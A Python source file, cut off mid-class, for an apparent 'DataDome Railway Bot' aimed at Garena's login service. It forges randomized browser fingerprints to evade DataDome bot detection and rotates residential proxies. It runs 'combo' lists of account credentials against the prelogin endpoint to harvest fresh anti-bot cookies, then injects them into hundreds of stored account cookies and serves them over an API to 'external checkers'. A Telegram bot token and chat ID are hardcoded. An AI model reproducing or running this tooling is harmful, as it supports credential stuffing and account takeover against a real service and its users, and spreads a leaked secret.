#!/usr/bin/env python3
"""
DataDome Railway Bot — Full Package
====================================
Features:
  - Continuous DataDome fetch (no interval — as fast as proxy allows)
  - Randomized browser fingerprint per request (anti-bot detection)
  - Combo/accounts harvesting via prelogin — fresh datadome replaces old ones
  - Telegram Bot for monitoring, proxy & combo management (inline menu)
  - Auto-detect .txt files in proxy/combo folders
  - HTTP API raw link for monitoring current datadome
  - Railway-ready with environment variable config

Environment Variables:
  BOT_TOKEN       Telegram bot token
  CHAT_ID         Telegram chat ID (optional — bot auto-detects owner)
  PROXY_FOLDER    Path to proxy folder (default: /data/proxy)
  COMBO_FOLDER    Path to combo/accounts folder (default: /data/combo)
  COOKIE_FILE     Path to full cookie TXT (default: /data/full_cookie.txt)
  API_PORT        Port for HTTP API (default: 8080)
  MAX_RETRIES     Max retries per fetch (default: 3)
  TIMEOUT         Request timeout ms (default: 5000)
  BOT_MODE        Suppress spam (default: true)
  DELAY_MS        Delay between fetches in ms (default: 0 = no delay)
  COMBO_THREADS   Parallel threads for combo harvesting (default: 10)
"""

import os
import sys
import time
import json
import random
import signal
import string
import urllib.parse
import threading
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ═══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN     = os.environ.get("BOT_TOKEN", "8642663150:AAE2taGFO5HS30aqTY1qyM71CtLmSHB4VCk")
CHAT_ID       = os.environ.get("CHAT_ID", "5028065177")
PROXY_FOLDER  = os.environ.get("PROXY_FOLDER", "./data/proxy")
COMBO_FOLDER  = os.environ.get("COMBO_FOLDER", "./data/combo")
COOKIE_FILE   = os.environ.get("COOKIE_FILE", "./data/full_cookie.txt")
API_PORT      = int(os.environ.get("API_PORT", "8080"))
MAX_RETRIES   = int(os.environ.get("MAX_RETRIES", "3"))
TIMEOUT       = int(os.environ.get("TIMEOUT", "15000")) / 1000  # ms → seconds — residential proxies need more time
DELAY_MS      = int(os.environ.get("DELAY_MS", "0"))           # 0 = no delay
BOT_MODE      = os.environ.get("BOT_MODE", "true").lower() in ("true", "1", "yes")
NUM_WORKERS   = int(os.environ.get("NUM_WORKERS", "20"))        # parallel fetch workers
COMBO_THREADS = int(os.environ.get("COMBO_THREADS", "10"))      # parallel combo harvest threads

# ═══════════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════════
import logging

for _lib in ("urllib3", "requests", "httpcore", "httpx"):
    logging.getLogger(_lib).setLevel(logging.CRITICAL)
    logging.getLogger(_lib).propagate = False

# Suppress InsecureRequestWarning from verify=False (residential proxy tunnels)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger("ddbot")
logger.setLevel(logging.DEBUG if not BOT_MODE else logging.INFO)
_h = logging.StreamHandler(sys.stdout)
_h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
logger.addHandler(_h)

# ═══════════════════════════════════════════════════════════════
#  DATADOME PAYLOAD  (randomized fingerprint per request)
# ═══════════════════════════════════════════════════════════════
_DD_URL = "https://dd.garena.com/js/"


def _random_fingerprint():
    """
    Generate a randomised but realistic-looking browser fingerprint.
    Varying these values per-request prevents DataDome from fingerprinting
    the static payload as a bot.
    (Ported from cookie_getter.py)
    """
    # Pick a realistic screen resolution
    screens = [
        (1920, 1080), (1920, 1080), (1920, 1080),  # weighted common
        (1366, 768),  (1440, 900),  (1536, 864),
        (2560, 1440), (1280, 720),
    ]
    rs_w, rs_h = random.choice(screens)
    dpr_choices = [1.0, 1.25, 1.5, 2.0]
    pr = random.choice(dpr_choices)

    # Taskbar takes ~40px
    ars_h = rs_h - random.randint(30, 50)
    ars_w = rs_w

    # Browser chrome (title bar + tabs) takes 60-120px
    br_oh = ars_h - random.randint(60, 130)
    br_ow = ars_w
    br_h  = br_oh - random.randint(0, 20)
    br_w  = br_ow - random.randint(0, 30)

    # Timing — realistic human page-load range
    ttst  = round(random.uniform(40.0, 200.0), 8)
    tagpu = round(random.uniform(2.0,  20.0),  8)

    # CID — 88-char base64url-ish string (matches DataDome format)
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~_-"
    cid = ''.join(random.choices(alphabet, k=88))

    # Chrome version — rotate between a few recent ones
    chrome_ver = random.choice(["129", "130", "131", "132", "133"])
    ua = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
          f"AppleWebKit/537.36 (KHTML, like Gecko) "
          f"Chrome/{chrome_ver}.0.0.0 Safari/537.36")

    # Hardware concurrency
    hc = random.choice([4, 6, 8, 10, 12, 16])

    # Timezone offset — PH is -480
    tz = random.choice([-480, -480, -480, -420, -300, 0, 60])

    fp = {
        "ttst": ttst, "ifov": False, "hc": hc,
        "br_oh": br_oh, "br_ow": br_ow, "ua": ua,
        "wbd": False, "dp0": True, "tagpu": tagpu,
        "wdif": False, "wdifrm": False, "npmtm": False,
        "br_h": br_h, "br_w": br_w, "isf": False, "nddc": 1,
        "rs_h": rs_h, "rs_w": rs_w, "rs_cd": 24,
        "phe": False, "nm": False, "jsf": False,
        "lg": "en-US", "pr": pr, "ars_h": ars_h, "ars_w": ars_w,
        "tz": tz, "str_ss": True, "str_ls": True, "str_idb": True,
        "str_odb": False, "plgod": False, "plg": 5, "plgne": True,
        "plgre": True, "plgof": False, "plggt": False, "pltod": False,
        "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False,
        "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33,
        "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False,
        "vnd": "Google Inc.", "bid": "NA",
        "mmt": "application/pdf,text/pdf",
        "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": False, "awe": False, "geb": False, "dat": False,
        "med": "defined", "aco": "probably", "acots": False,
        "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
        "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True,
        "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
        "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False,
        "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False,
        "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True,
        "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
        "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True,
        "dvm": 8, "sqt": False, "so": "landscape-primary",
        "bda": False, "wdw": True, "prm": True, "tzp": True,
        "cvs": True, "usb": True, "cap": True, "tbf": False,
        "lgs": True, "tpd": True,
    }

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://account.garena.com",
        "pragma": "no-cache",
        "referer": "https://account.garena.com/",
        "sec-ch-ua": f'"Google Chrome";v="{chrome_ver}", "Not=A?Brand";v="8", "Chromium";v="{chrome_ver}"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": ua,
    }

    payload = {
        "jsData":        json.dumps(fp),
        "eventCounters": "[]",
        "jsType":        "ch",
        "cid":           cid,
        "ddk":           "AE3F04AD3F0D3A462481A337485081",
        "Referer":       "https://account.garena.com/",
        "request":       "/",
        "responsePage":  "origin",
        "ddv":           "4.35.4",
    }

    encoded_data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())

    return headers, encoded_data

# ═══════════════════════════════════════════════════════════════
#  PROXY SCANNER  (auto-detect .txt files in proxy folder)
# ═══════════════════════════════════════════════════════════════
class ProxyScanner:
    """Scans a folder for .txt files containing proxies.
    
    - Auto-detects all .txt files in PROXY_FOLDER
    - Loads proxies from each file (ip:port, ip:port:user:pass, http://...)
    - Round-robin rotation across all loaded proxies
    - Auto-rescan every N cycles to pick up new/modified files
    - Thread-safe
    """

    def __init__(self, folder_path, rescan_every=15):
        self.folder = folder_path
        self.proxies = []
        self.idx = 0
        self._lock = threading.Lock()
        self._cycle = 0
        self._rescan_every = rescan_every
        self._file_stats = {}   # {filename: proxy_count}
        self._thread_idx = {}   # {thread_id: per-thread proxy index}
        os.makedirs(self.folder, exist_ok=True)
        self.rescan()

    def rescan(self):
        """Rescan folder for .txt files and reload all proxies."""
        with self._lock:
            old_n = len(self.proxies)
            self.proxies = []
            self._file_stats = {}
            self._thread_idx = {}   # reset per-thread indices on rescan

            if not os.path.isdir(self.folder):
                logger.warning(f"[PROXY] Folder not found: {self.folder}")
                return 0

            txt_files = sorted([
                f for f in os.listdir(self.folder)
                if f.lower().endswith(".txt")
            ])

            for fname in txt_files:
                fpath = os.path.join(self.folder, fname)
                loaded = self._load_file(fpath)
                self._file_stats[fname] = loaded

            random.shuffle(self.proxies)
            self.idx = 0
            new_n = len(self.proxies)

            if new_n != old_n:
                logger.info(f"[PROXY] Rescan: {old_n} → {new_n} proxies from {len(txt_files)} file(s)")
            return new_n

    def _load_file(self, filepath):
        """Load proxies from a single file. Returns count loaded."""
        count = 0
        try:
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    proxy_url = self._parse(line)
                    if proxy_url:
                        self.proxies.append(proxy_url)
                        count += 1
        except Exception as e:
            logger.warning(f"[PROXY] Error reading {filepath}: {e}")
        return count

    @staticmethod
    def _parse(line):
        if "://" in line:
            # Already has scheme — normalise https:// residential proxies to http://
            # Residential rotating proxies use HTTP tunneling even if written as https://
            if line.startswith("https://"):
                line = "http://" + line[len("https://"):]
            return line
        parts = line.split(":")
        if len(parts) == 2:
            # host:port
            return f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            # host:port:user:pass  OR  user:pass:host:port — try both orderings
            # Most residential proxy providers use host:port:user:pass
            host, port, user, passwd = parts
            # Validate: port should be numeric
            if port.isdigit():
                return f"http://{user}:{passwd}@{host}:{port}"
            else:
                # Maybe user:pass:host:port ordering
                user2, passwd2, host2, port2 = parts
                if port2.isdigit():
                    return f"http://{user2}:{passwd2}@{host2}:{port2}"
        return None

    def get_next(self, thread_id=None):
        """Get next proxy for a specific thread (or global round-robin if no thread_id).
        
        Each thread_id gets its OWN rotating index — so thread-0 cycles through
        proxy-0, proxy-1, proxy-2 … independently from thread-1, thread-2, etc.
        This prevents multiple threads from hammering the same proxy at the same time.
        """
        with self._lock:
            self._cycle += 1
            # Auto-rescan
            if self._rescan_every > 0 and self._cycle % self._rescan_every == 0:
                self._do_rescan_locked()

            if not self.proxies:
                return None, None

            if thread_id is not None:
                # Per-thread counter: thread N starts at offset N, steps by NUM_WORKERS
                if thread_id not in self._thread_idx:
                    self._thread_idx[thread_id] = thread_id  # staggered start
                proxy_url = self.proxies[self._thread_idx[thread_id] % len(self.proxies)]
                self._thread_idx[thread_id] += 1
            else:
                proxy_url = self.proxies[self.idx % len(self.proxies)]
                self.idx += 1

            return {"http": proxy_url, "https": proxy_url}, proxy_url

    def _do_rescan_locked(self):
        """Internal rescan (already holding lock)."""
        old_n = len(self.proxies)
        self.proxies = []
        self._file_stats = {}

        os.makedirs(self.folder, exist_ok=True)
        txt_files = sorted([
            f for f in os.listdir(self.folder)
            if f.lower().endswith(".txt")
        ]) if os.path.isdir(self.folder) else []

        for fname in txt_files:
            fpath = os.path.join(self.folder, fname)
            loaded = self._load_file(fpath)
            self._file_stats[fname] = loaded

        random.shuffle(self.proxies)
        self.idx = 0
        new_n = len(self.proxies)
        if new_n != old_n:
            logger.info(f"[PROXY] Auto-rescan: {old_n} → {new_n} proxies")

    def current_display(self):
        with self._lock:
            if not self.proxies:
                return "NONE"
            p = self.proxies[(self.idx - 1) % len(self.proxies)]
            if "@" in p:
                return p.split("@")[1] + "(auth)"
            return p.replace("http://", "")

    @property
    def total(self):
        with self._lock:
            return len(self.proxies)

    def get_file_stats(self):
        with self._lock:
            return dict(self._file_stats)

    def add_proxy_to_file(self, filename, proxy_line):
        """Append a proxy to a specific file in the proxy folder."""
        fpath = os.path.join(self.folder, filename)
        os.makedirs(self.folder, exist_ok=True)
        with open(fpath, "a") as f:
            f.write(proxy_line.strip() + "\n")
        logger.info(f"[PROXY] Added '{proxy_line.strip()}' to {filename}")
        # Trigger rescan
        self.rescan()

    def create_file(self, filename, proxy_lines):
        """Create a new proxy file with multiple lines."""
        fpath = os.path.join(self.folder, filename)
        os.makedirs(self.folder, exist_ok=True)
        with open(fpath, "w") as f:
            for line in proxy_lines:
                line = line.strip()
                if line:
                    f.write(line + "\n")
        logger.info(f"[PROXY] Created {filename} with {len(proxy_lines)} proxies")
        self.rescan()

    def list_files(self):
        """List all .txt files in proxy folder."""
        if not os.path.isdir(self.folder):
            return []
        return sorted([
            f for f in os.listdir(self.folder)
            if f.lower().endswith(".txt")
        ])

    def delete_file(self, filename):
        """Delete a proxy file."""
        fpath = os.path.join(self.folder, filename)
        if os.path.exists(fpath):
            os.remove(fpath)
            logger.info(f"[PROXY] Deleted {filename}")
            self.rescan()


# ═══════════════════════════════════════════════════════════════
#  COOKIE FILE UPDATER
# ═══════════════════════════════════════════════════════════════

import re as _re

# Extra cookie files to sync datadome into (e.g. checker's fresh_cookie.txt).
# Add more paths here or set via EXTRA_COOKIE_FILES env var (comma-separated).
_EXTRA_COOKIE_FILES_ENV = os.environ.get("EXTRA_COOKIE_FILES", "")
EXTRA_COOKIE_FILES: list[str] = [
    p.strip() for p in _EXTRA_COOKIE_FILES_ENV.split(",") if p.strip()
]

class CookieUpdater:
    """Thread-safe multi-line cookie file updater.

    full_cookie.txt can hold hundreds of full cookie lines (one per account).
    On every datadome update, ALL lines get the fresh datadome value injected —
    no reload needed, the file is always live.

    /cookie API endpoint streams all lines so external tools always see fresh values.
    """

    def __init__(self, filepath):
        self.filepath = filepath
        self._lock = threading.Lock()
        # In-memory cache of all cookie lines — updated atomically on each write
        self._lines_cache: list[str] = []
        self._load_cache()

    # Maximum cookie lines to keep in memory and on disk
    MAX_COOKIE_LINES = 500

    def _load_cache(self):
        """Load all non-empty, non-comment cookie lines into memory — capped at MAX_COOKIE_LINES."""
        if not os.path.exists(self.filepath):
            self._lines_cache = []
            return
        try:
            all_lines = []
            with open(self.filepath, "r") as f:
                for line in f:
                    stripped = line.strip()
                    if stripped and not stripped.startswith("#"):
                        all_lines.append(stripped)
            total = len(all_lines)
            self._lines_cache = all_lines[:self.MAX_COOKIE_LINES]
            if total > self.MAX_COOKIE_LINES:
                logger.info(
                    f"[COOKIE] Auto-cut cookie file: {total} lines → {self.MAX_COOKIE_LINES} "
                    f"(trimmed {total - self.MAX_COOKIE_LINES})"
                )
        except Exception as e:
            logger.warning(f"[COOKIE] Error loading cache: {e}")
            self._lines_cache = []

    # ── Internal: replace datadome= in a single cookie string ────────
    @staticmethod
    def _inject_dd(line: str, new_value: str) -> str:
        """Replace datadome=VALUE in a cookie string. Returns updated string."""
        if "datadome=" in line:
            return _re.sub(r'datadome=[^;]*', f'datadome={new_value}', line)
        # No datadome field yet — append it
        return line.rstrip(";") + f"; datadome={new_value}"

    # ── Public: update all lines with fresh datadome ──────────────────
    def update_datadome(self, new_value: str) -> dict:
        """Inject fresh datadome into EVERY line in the cookie file.

        All 500 lines get updated in one atomic write — no reload needed.
        Returns {"success": bool, "lines_changed": int, "error": str|None}
        """
        with self._lock:
            dirpath = os.path.dirname(self.filepath)
            if dirpath:
                os.makedirs(dirpath, exist_ok=True)

            # If file doesn't exist yet, create with just datadome
            if not os.path.exists(self.filepath):
                try:
                    with open(self.filepath, "w") as f:
                        f.write(f"datadome={new_value}\n")
                    self._lines_cache = [f"datadome={new_value}"]
                    return {"success": True, "lines_changed": 1, "error": None}
                except Exception as e:
                    return {"success": False, "lines_changed": 0, "error": str(e)}

            try:
                with open(self.filepath, "r") as f:
                    raw_lines = f.readlines()

                new_lines = []
                changed = 0
                for raw in raw_lines:
                    stripped = raw.strip()
                    if not stripped or stripped.startswith("#"):
                        new_lines.append(raw)  # preserve comments/blanks as-is
                        continue
                    updated = self._inject_dd(stripped, new_value)
                    new_lines.append(updated + "\n")
                    changed += 1

                with open(self.filepath, "w") as f:
                    f.writelines(new_lines)

                # Refresh in-memory cache
                self._lines_cache = [
                    l.strip() for l in new_lines
                    if l.strip() and not l.strip().startswith("#")
                ]

                # Sync extra files if configured
                for extra_path in EXTRA_COOKIE_FILES:
                    try:
                        self._sync_extra(extra_path, new_value)
                    except Exception as ex:
                        logger.debug(f"[COOKIE] Extra sync failed for {extra_path}: {ex}")

                return {"success": True, "lines_changed": changed, "error": None}

            except Exception as e:
                return {"success": False, "lines_changed": 0, "error": str(e)}

    def _sync_extra(self, filepath: str, new_value: str):
        """Sync datadome into an extra cookie file."""
        if not os.path.exists(filepath):
            return
        with open(filepath, "r") as f:
            lines = f.readlines()
        new_lines = []
        for raw in lines:
            stripped = raw.strip()
            if not stripped or stripped.startswith("#"):
                new_lines.append(raw)
                continue
            new_lines.append(self._inject_dd(stripped, new_value) + "\n")
        with open(filepath, "w") as f:
            f.writelines(new_lines)
        logger.debug(f"[COOKIE] ✔ Synced datadome → {filepath}")

    def read_current_datadome(self) -> str | None:
        """Read the current datadome value from the first valid line."""
        with self._lock:
            for line in self._lines_cache:
                for part in line.split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        return part.split("=", 1)[1].strip()
        # Fallback: read from file
        if not os.path.exists(self.filepath):
            return None
        try:
            with open(self.filepath, "r") as f:
                for line in f:
                    for part in line.split(";"):
                        part = part.strip()
                        if part.startswith("datadome="):
                            return part.split("=", 1)[1].strip()
        except Exception:
            pass
        return None

    def read_full_cookie(self) -> str | None:
        """Return the single richest cookie line (most fields).

        Used by the combo harvester for prelogin requests.
        """
        with self._lock:
            best = None
            best_count = 0
            for line in self._lines_cache:
                fields = [p.strip() for p in line.split(";") if p.strip()]
                # Skip bare datadome-only lines
                if len(fields) == 1 and fields[0].lower().startswith("datadome="):
                    continue
                if len(fields) > best_count:
                    best_count = len(fields)
                    best = line
            if best is None:
                logger.warning(
                    f"[COOKIE] No full cookie line found — set COOKIE env var or use /cookieset"
                )
            return best

    def read_all_cookies(self) -> list[str]:
        """Return ALL cookie lines (all accounts) with their current datadome values.

        Used by the /cookie API endpoint — streams all lines so external checkers
        always get fresh values without reloading.
        """
        with self._lock:
            return list(self._lines_cache)

    def write_cookie(self, cookie_string: str):
        """Write/overwrite the cookie file — capped at MAX_COOKIE_LINES.

        Supports multi-line input (one cookie per line) or single line.
        Any lines beyond MAX_COOKIE_LINES are silently dropped.
        """
        dirpath = os.path.dirname(self.filepath)
        if dirpath:
            os.makedirs(dirpath, exist_ok=True)
        with self._lock:
            all_lines = [l.strip() for l in cookie_string.strip().splitlines() if l.strip()]
            lines = all_lines[:self.MAX_COOKIE_LINES]
            trimmed = len(all_lines) - len(lines)
            with open(self.filepath, "w") as f:
                for line in lines:
                    f.write(line + "\n")
            self._lines_cache = lines
        if trimmed:
            logger.info(f"[COOKIE] write_cookie: trimmed {trimmed} lines beyond limit ({self.MAX_COOKIE_LINES} kept)")
        logger.info(f"[COOKIE] Wrote {len(lines)} cookie line(s) to {self.filepath}")




# ═══════════════════════════════════════════════════════════════
#  COMBO MANAGER  (accounts.txt — same folder logic as proxy)
# ═══════════════════════════════════════════════════════════════
class ComboManager:
    """
    Manages combo/accounts .txt files in COMBO_FOLDER.
    - Auto-detects all .txt files in folder
    - Round-robin account rotation across threads
    - Thread-safe add/delete/list
    - Same folder structure pattern as ProxyScanner
    """

    def __init__(self, folder_path):
        self.folder = folder_path
        self._lock = threading.Lock()
        self._accounts = []       # flat list of all accounts
        self._file_stats = {}     # {filename: account_count}
        self._idx = 0
        os.makedirs(self.folder, exist_ok=True)
        self.rescan()

    def rescan(self):
        """Rescan folder for .txt files and reload all accounts."""
        with self._lock:
            self._accounts = []
            self._file_stats = {}
            if not os.path.isdir(self.folder):
                return 0
            txt_files = sorted([
                f for f in os.listdir(self.folder)
                if f.lower().endswith(".txt")
            ])
            for fname in txt_files:
                fpath = os.path.join(self.folder, fname)
                loaded = self._load_file(fpath)
                self._file_stats[fname] = loaded
            self._idx = 0
            return len(self._accounts)

    def _load_file(self, filepath):
        count = 0
        try:
            for enc in ("utf-8", "latin-1", "cp1252"):
                try:
                    with open(filepath, "r", encoding=enc, errors="ignore") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith("#") and not line.startswith("==="):
                                self._accounts.append(line)
                                count += 1
                    break
                except UnicodeDecodeError:
                    continue
        except Exception as e:
            logger.warning(f"[COMBO] Error reading {filepath}: {e}")
        return count

    def get_next(self):
        """Round-robin next account. Returns account string or None."""
        with self._lock:
            if not self._accounts:
                return None
            acc = self._accounts[self._idx % len(self._accounts)]
            self._idx += 1
            return acc

    def get_all(self):
        """Return a shuffled copy of all accounts."""
        with self._lock:
            copy = list(self._accounts)
        random.shuffle(copy)
        return copy

    def create_file(self, filename, lines):
        """Create a new combo file."""
        fpath = os.path.join(self.folder, filename)
        os.makedirs(self.folder, exist_ok=True)
        with open(fpath, "w", encoding="utf-8") as f:
            for line in lines:
                line = line.strip()
                if line:
                    f.write(line + "\n")
        logger.info(f"[COMBO] Created {filename} with {len(lines)} accounts")
        self.rescan()

    def delete_file(self, filename):
        """Delete a combo file."""
        fpath = os.path.join(self.folder, filename)
        if os.path.exists(fpath):
            os.remove(fpath)
            logger.info(f"[COMBO] Deleted {filename}")
            self.rescan()

    def list_files(self):
        if not os.path.isdir(self.folder):
            return []
        return sorted([
            f for f in os.listdir(self.folder)
            if f.lower().endswith(".txt")
        ])

    def get_file_stats(self):
        with self._lock:
            return dict(self._file_stats)

    @property
    def total(self):
        with self._lock:
            return len(self._accounts)


# ═══════════════════════════════════════════════════════════════
#  COMBO HARVESTER
#  Hits sso.garena.com/api/prelogin per account.
#  Garena returns a fresh datadome in Set-Cookie — we capture it
#  and REPLACE the old datadome in the cookie file (same as
#  update_datadome() does for the DD fetch loop).
# ═══════════════════════════════════════════════════════════════
_combo_thread_local = threading.local()
_combo_session_lock = threading.Lock()


def _get_combo_session(proxy_dict):
    """Create a fresh cloudscraper session for each combo request (ensures IP rotation)."""
    try:
        import cloudscraper as _cloudscraper
    except ImportError:
        raise RuntimeError("cloudscraper not installed. Run: pip install cloudscraper")
    with _combo_session_lock:
        time.sleep(random.uniform(0.05, 0.2))
    sess = _cloudscraper.create_scraper()
    if proxy_dict:
        sess.proxies.update(proxy_dict)
        sess.verify = False  # residential proxies may have self-signed tunnel certs
    return sess


def _harvest_prelogin(account, proxy_dict, updater=None):
    """
    Hit prelogin for `account`. Returns fresh datadome value or None.
    Garena returns Set-Cookie datadome before checking the password.

    On 403:
      1. Load the FULL cookie (richest line — all fields like sso_key, PHPSESSID, etc.)
      2. Inject the latest fresh datadome into that full cookie string before sending
      3. Retry with the full cookie in the Cookie header
    """
    url = "https://sso.garena.com/api/prelogin"
    username = account.split(":")[0].strip()
    params = {
        "app_id": "10100",
        "account": username,
        "format": "json",
        "id": str(int(time.time() * 1000)),
    }

    sess = _get_combo_session(proxy_dict)

    for attempt in range(3):
        cv = random.choice(["129", "130", "131", "132", "133"])
        ua = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              f"AppleWebKit/537.36 (KHTML, like Gecko) "
              f"Chrome/{cv}.0.0.0 Safari/537.36")
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "connection": "keep-alive",
            "host": "sso.garena.com",
            "referer": (f"https://sso.garena.com/universal/login?app_id=10100"
                        f"&redirect_uri=https%3A%2F%2Faccount.garena.com%2F"
                        f"&locale=en-SG&account={username}"),
            "sec-ch-ua": f'"Google Chrome";v="{cv}", "Chromium";v="{cv}", "Not=A?Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": ua,
        }

        # Normal attempt (attempt 0): use just datadome from session/cookie file
        # 403 retry (attempt >= 1): use FULL cookie with latest fresh datadome injected
        if attempt == 0:
            dd = sess.cookies.get("datadome")
            if not dd and updater:
                dd = updater.read_current_datadome()
                if dd:
                    sess.cookies.set("datadome", dd, domain=".garena.com")
            if dd:
                headers["cookie"] = f"datadome={dd}"
        else:
            # Use full cookie — inject latest fresh datadome into it
            if updater:
                full_cookie = updater.read_full_cookie()
                fresh_dd = updater.read_current_datadome()
                if full_cookie and fresh_dd:
                    # Replace datadome value in the full cookie string with the freshest one
                    full_cookie_updated = _re.sub(
                        r'datadome=[^;]*',
                        f'datadome={fresh_dd}',
                        full_cookie
                    )
                    headers["cookie"] = full_cookie_updated
                    # Also seed the session so subsequent requests stay consistent
                    sess.cookies.set("datadome", fresh_dd, domain=".garena.com")
                    logger.debug(
                        f"[COMBO] 403-retry {attempt} for {username} — "
                        f"full cookie ({len(full_cookie_updated)} chars), "
                        f"datadome={fresh_dd[:20]}..."
                    )
                elif fresh_dd:
                    # full_cookie.txt missing or empty — fallback to datadome= only
                    # Fix: set the COOKIE env var on Railway with your full cookie string
                    logger.warning(
                        f"[COMBO] ⚠ Full cookie not available for 403-retry ({username}) — "
                        f"falling back to datadome= only. Set COOKIE env var on Railway!"
                    )
                    headers["cookie"] = f"datadome={fresh_dd}"
                    sess.cookies.set("datadome", fresh_dd, domain=".garena.com")

        time.sleep(random.uniform(0.1, 0.4))
        try:
            resp = sess.get(url, headers=headers, params=params, timeout=(30, TIMEOUT + 10))

            # Extract datadome from Set-Cookie
            set_cookie = resp.headers.get("set-cookie", "")
            if set_cookie:
                for part in set_cookie.split(","):
                    part = part.strip()
                    if "datadome=" in part.lower():
                        for seg in part.split(";"):
                            seg = seg.strip()
                            if seg.lower().startswith("datadome="):
                                val = seg[len("datadome="):].strip()
                                if val and len(val) >= 20:
                                    return val

            # Also check response cookies
            dd_resp = resp.cookies.get("datadome")
            if dd_resp and len(dd_resp) >= 20:
                return dd_resp

            if resp.status_code == 403:
                logger.debug(f"[COMBO] 403 on {username} (attempt {attempt+1}) — switching to full cookie on next retry")
                # Fresh session — next attempt will use full cookie with fresh datadome
                sess = _get_combo_session(proxy_dict)
                time.sleep(random.uniform(0.5, 1.5))
                continue

            return None

        except (requests.exceptions.ConnectionError,
                requests.exceptions.Timeout,
                requests.exceptions.ProxyError):
            # Get a fresh session with new proxy on error
            sess = _get_combo_session(proxy_dict)
            if attempt < 2:
                time.sleep(random.uniform(0.5, 1.2))
            continue
        except Exception as e:
            logger.debug(f"[COMBO] prelogin error ({username}): {e}")
            return None

    return None


class ComboHarvester:
    """
    Runs combo harvesting in a background thread pool.
    Each account hits prelogin → fresh datadome → replaces old datadome
    in the cookie file (via CookieUpdater.update_datadome).
    """

    def __init__(self, combo_manager, scanner, updater, stats):
        self.combo_manager = combo_manager
        self.scanner = scanner
        self.updater = updater
        self.stats = stats           # ComboStats instance
        self._running = False
        self._stop_event = threading.Event()
        self._thread = None

    def start(self, threads=COMBO_THREADS):
        if self._running:
            return False
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._run, args=(threads,), daemon=True
        )
        self._thread.start()
        return True

    def stop(self):
        self._stop_event.set()
        self._running = False

    @property
    def is_running(self):
        return self._running

    def _run(self, threads):
        accounts = self.combo_manager.get_all()
        if not accounts:
            logger.warning("[COMBO] No accounts loaded — harvester stopped")
            self._running = False
            return

        logger.info(f"[COMBO] Starting infinite harvester: {len(accounts)} accounts, {threads} threads")

        def worker(account):
            if self._stop_event.is_set():
                return
            proxy_dict, _ = self.scanner.get_next()
            dd = _harvest_prelogin(account, proxy_dict, updater=self.updater)
            if dd:
                result = self.updater.update_datadome(dd)
                if result.get("success"):
                    self.stats.record(hit=True, updated=True)
                    logger.debug(f"[COMBO] ✔ {account.split(':')[0]} → datadome updated")
                else:
                    self.stats.record(hit=True, updated=False)
            else:
                self.stats.record(hit=False, updated=False)

        from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac

        cycle = 0
        with _TPE(max_workers=threads, thread_name_prefix="combo") as pool:
            while not self._stop_event.is_set():
                cycle += 1
                # Re-fetch accounts each cycle so new uploads are picked up
                accounts = self.combo_manager.get_all()
                if not accounts:
                    logger.warning("[COMBO] No accounts — waiting 5s...")
                    self._stop_event.wait(5)
                    continue

                self.stats.reset(len(accounts))
                logger.info(f"[COMBO] Cycle #{cycle} — {len(accounts)} accounts")

                futures = {pool.submit(worker, acc): acc for acc in accounts}
                for fut in _ac(futures):
                    if self._stop_event.is_set():
                        break
                    try:
                        fut.result()
                    except Exception as e:
                        logger.debug(f"[COMBO] worker error: {e}")

                if not self._stop_event.is_set():
                    s = self.stats.get()
                    logger.info(
                        f"[COMBO] Cycle #{cycle} done — "
                        f"hits: {s['hits']}, updated: {s['updated']}, misses: {s['misses']} — looping..."
                    )

        self._running = False
        logger.info(f"[COMBO] Harvester stopped after {cycle} cycle(s) — {self.stats.get()}")


class ComboStats:
    """Thread-safe stats for combo harvesting."""

    def __init__(self):
        self._lock = threading.Lock()
        self._hits = 0
        self._updated = 0
        self._misses = 0
        self._total = 0

    def reset(self, total):
        with self._lock:
            self._hits = 0
            self._updated = 0
            self._misses = 0
            self._total = total

    def record(self, hit, updated):
        with self._lock:
            if hit:
